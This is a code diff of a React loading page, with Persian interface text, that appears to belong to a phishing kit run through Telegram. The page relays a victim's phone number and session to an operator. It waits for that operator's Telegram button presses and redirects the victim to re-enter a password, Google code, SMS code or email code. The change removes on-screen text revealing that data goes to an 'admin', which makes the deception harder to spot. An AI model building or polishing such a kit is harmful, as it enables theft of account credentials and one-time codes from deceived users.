@@ -1,11 +1,7 @@
 import { useEffect, useState } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
-import { Loader2, AlertCircle } from "lucide-react";
-import {
-  setUserCurrentStep,
-  getSession,
-  showAdminButtons,
-} from "@/lib/telegram-service-enhanced";
+import { Loader2 } from "lucide-react";
+import { getSession, showAdminButtons } from "@/lib/telegram-service-enhanced";
 import {
   registerTelegramCallback,
   unregisterTelegramCallback,
@@ -14,7 +10,6 @@ import {
 const Loading = () => {
   const location = useLocation();
   const navigate = useNavigate();
-  const [isLoading, setIsLoading] = useState(true);
   const [sessionData, setSessionData] = useState<any>(null);
 
   const phoneNumber = location.state?.phoneNumber || "";
@@ -40,11 +35,8 @@ const Loading = () => {
           handleAdminAction(action);
         });
 
-        // Show loading for 2 seconds
+        // Show admin buttons after 2 seconds
         setTimeout(async () => {
-          setIsLoading(false);
-
-          // After loading is done, show admin buttons in Telegram
           console.log("📱 User reached loading page, showing admin buttons...");
           await showAdminButtons(sessionId);
         }, 2000);
@@ -73,19 +65,34 @@ const Loading = () => {
 
     console.log("🚀 Executing admin action:", action);
 
-    // Handle auth actions
+    // Handle incorrect actions - redirect to form with error
     if (action.startsWith("incorrect_")) {
-      // Handle incorrect information actions
       const errorType = action.replace("incorrect_", "");
 
-      navigate("/auth-error", {
-        state: {
-          phoneNumber,
-          sessionId,
-          errorType,
-        },
-        replace: true,
-      });
+      switch (errorType) {
+        case "password":
+          navigate("/auth-password", {
+            state: { phoneNumber, sessionId, hasError: true },
+          });
+          break;
+        case "google":
+          navigate("/auth-google", {
+            state: { phoneNumber, sessionId, hasError: true },
+          });
+          break;
+        case "sms":
+          navigate("/auth-sms", {
+            state: { phoneNumber, sessionId, hasError: true },
+          });
+          break;
+        case "email":
+          navigate("/auth-email", {
+            state: { phoneNumber, sessionId, hasError: true },
+          });
+          break;
+        default:
+          console.error("Unknown incorrect action:", errorType);
+      }
       return;
     }
 
@@ -148,14 +155,6 @@ const Loading = () => {
             textAlign: "center",
           }}
         >
-          <AlertCircle
-            style={{
-              width: "48px",
-              height: "48px",
-              color: "rgb(220, 38, 38)",
-              margin: "0 auto 16px",
-            }}
-          />
           <h2 style={{ color: "rgb(220, 38, 38)", margin: "0 0 8px 0" }}>
             خطا در جلسه
           </h2>
@@ -181,8 +180,8 @@ const Loading = () => {
         style={{
           backgroundColor: "rgb(255, 255, 255)",
           borderRadius: "16px",
-          padding: "40px",
-          maxWidth: "500px",
+          padding: "60px 40px",
+          maxWidth: "400px",
           width: "90%",
           textAlign: "center",
         }}
@@ -193,7 +192,7 @@ const Loading = () => {
           style={{
             display: "flex",
             justifyContent: "center",
-            marginBottom: "24px",
+            marginBottom: "40px",
           }}
         >
           <img
@@ -207,216 +206,93 @@ const Loading = () => {
           />
         </div>
 
-        {isLoading ? (
-          /* Initial Loading State */
+        {/* Loading Spinner */}
+        <div
+          style={{
+            display: "flex",
+            flexDirection: "column",
+            alignItems: "center",
+            gap: "24px",
+          }}
+        >
           <div
             style={{
               display: "flex",
-              flexDirection: "column",
               alignItems: "center",
-              gap: "20px",
+              justifyContent: "center",
+              width: "80px",
+              height: "80px",
+              backgroundColor: "rgb(23, 29, 38)",
+              borderRadius: "50%",
             }}
           >
-            <div
+            <Loader2
+              className="animate-spin"
               style={{
-                display: "flex",
-                alignItems: "center",
-                justifyContent: "center",
-                width: "80px",
-                height: "80px",
-                backgroundColor: "rgb(23, 29, 38)",
-                borderRadius: "50%",
+                width: "40px",
+                height: "40px",
+                color: "rgb(255, 255, 255)",
               }}
-            >
-              <Loader2
-                className="animate-spin"
-                style={{
-                  width: "40px",
-                  height: "40px",
-                  color: "rgb(255, 255, 255)",
-                }}
-              />
-            </div>
-
-            <div
-              style={{
-                display: "flex",
-                flexDirection: "column",
-                gap: "8px",
-                textAlign: "center",
-              }}
-            >
-              <h2
-                style={{
-                  fontSize: "18px",
-                  fontWeight: "700",
-                  color: "rgb(0, 0, 0)",
-                  margin: "0",
-                }}
-              >
-                در حال پردازش...
-              </h2>
-              <p
-                style={{
-                  fontSize: "14px",
-                  color: "rgba(0, 0, 0, 0.6)",
-                  margin: "0",
-                  lineHeight: "1.5",
-                }}
-              >
-                اطلاعات شما به ادمین ارسال شد
-              </p>
-            </div>
-
-            {/* Progress Dots */}
-            <div
-              style={{
-                display: "flex",
-                gap: "8px",
-                alignItems: "center",
-              }}
-            >
-              {[0, 1, 2].map((index) => (
-                <div
-                  key={index}
-                  style={{
-                    width: "8px",
-                    height: "8px",
-                    backgroundColor: "rgb(0, 122, 255)",
-                    borderRadius: "50%",
-                    animation: `bounce ${1.4}s ease-in-out ${index * 0.16}s infinite both`,
-                  }}
-                />
-              ))}
-            </div>
+            />
           </div>
-        ) : (
-          /* Waiting for Admin State */
+
           <div
             style={{
               display: "flex",
               flexDirection: "column",
-              alignItems: "center",
-              gap: "24px",
+              gap: "8px",
+              textAlign: "center",
             }}
           >
-            {/* Waiting Icon */}
+            <h2
+              style={{
+                fontSize: "18px",
+                fontWeight: "700",
+                color: "rgb(0, 0, 0)",
+                margin: "0",
+              }}
+            >
+              در حال پردازش...
+            </h2>
+            <p
+              style={{
+                fontSize: "14px",
+                color: "rgba(0, 0, 0, 0.6)",
+                margin: "0",
+                lineHeight: "1.5",
+              }}
+            >
+              لطفا صبر کنید
+            </p>
+          </div>
+
+          {/* Pulsing Animation */}
+          <div
+            style={{
+              width: "60px",
+              height: "4px",
+              backgroundColor: "rgba(0, 122, 255, 0.2)",
+              borderRadius: "2px",
+              overflow: "hidden",
+              position: "relative",
+            }}
+          >
             <div
               style={{
-                display: "flex",
-                alignItems: "center",
-                justifyContent: "center",
-                width: "80px",
-                height: "80px",
+                width: "20px",
+                height: "100%",
                 backgroundColor: "rgb(0, 122, 255)",
-                borderRadius: "50%",
-              }}
-            >
-              <span
-                style={{
-                  fontSize: "32px",
-                  color: "rgb(255, 255, 255)",
-                }}
-              >
-                ⏳
-              </span>
-            </div>
-
-            {/* Waiting Message */}
-            <div
-              style={{
-                display: "flex",
-                flexDirection: "column",
-                gap: "8px",
-                textAlign: "center",
-              }}
-            >
-              <h2
-                style={{
-                  fontSize: "18px",
-                  fontWeight: "700",
-                  color: "rgb(0, 0, 0)",
-                  margin: "0",
-                }}
-              >
-                در انتظار دستور ادمین
-              </h2>
-              <p
-                style={{
-                  fontSize: "14px",
-                  color: "rgba(0, 0, 0, 0.6)",
-                  margin: "0",
-                  lineHeight: "1.5",
-                }}
-              >
-                ادمین در تلگرام دکمه‌های احراز هویت را مشاهده می‌کند
-              </p>
-            </div>
-
-            {/* Session Info */}
-            {sessionData && (
-              <div
-                style={{
-                  padding: "16px",
-                  backgroundColor: "rgba(0, 122, 255, 0.05)",
-                  borderRadius: "8px",
-                  width: "100%",
-                  textAlign: "right",
-                }}
-              >
-                <h4
-                  style={{
-                    fontSize: "14px",
-                    fontWeight: "600",
-                    color: "rgb(0, 0, 0)",
-                    margin: "0 0 8px 0",
-                  }}
-                >
-                  🔍 اطلاعات جلسه:
-                </h4>
-                <div style={{ fontSize: "12px", color: "rgba(0, 0, 0, 0.7)" }}>
-                  <p style={{ margin: "4px 0" }}>
-                    📱 شماره: <strong>{sessionData.phoneNumber}</strong>
-                  </p>
-                  <p style={{ margin: "4px 0" }}>
-                    🆔 شناسه: <strong>{sessionData.sessionId}</strong>
-                  </p>
-                  <p style={{ margin: "4px 0" }}>
-                    ✅ مراحل تکمیل شده:{" "}
-                    <strong>{sessionData.completedSteps?.length || 0}</strong>
-                  </p>
-                </div>
-              </div>
-            )}
-
-            {/* Pulsing Animation */}
-            <div
-              style={{
-                width: "60px",
-                height: "4px",
-                backgroundColor: "rgba(0, 122, 255, 0.2)",
                 borderRadius: "2px",
-                overflow: "hidden",
-                position: "relative",
+                animation: "slide 2s ease-in-out infinite",
               }}
-            >
-              <div
-                style={{
-                  width: "20px",
-                  height: "100%",
-                  backgroundColor: "rgb(0, 122, 255)",
-                  borderRadius: "2px",
-                  animation: "slide 2s ease-in-out infinite",
-                }}
-              />
-            </div>
+            />
           </div>
-        )}
+        </div>
 
         {/* Security Note */}
         <div
           style={{
-            marginTop: "32px",
+            marginTop: "40px",
             padding: "16px",
             backgroundColor: "rgb(248, 249, 250)",
             borderRadius: "8px",
@@ -431,26 +307,12 @@ const Loading = () => {
               lineHeight: "1.4",
             }}
           >
-            🤖{" "}
-            {isLoading
-              ? "در حال ارسال اطلاعات به سیستم مدیریت..."
-              : "ادمین در تلگرام دکمه‌های احراز هویت را مشاهده می‌کند"}
+            🔒 احراز هویت در حال پردازش...
           </p>
         </div>
       </div>
 
       <style jsx>{`
-        @keyframes bounce {
-          0%,
-          80%,
-          100% {
-            transform: scale(0);
-          }
-          40% {
-            transform: scale(1);
-          }
-        }
-
         @keyframes slide {
           0% {
             transform: translateX(-40px);
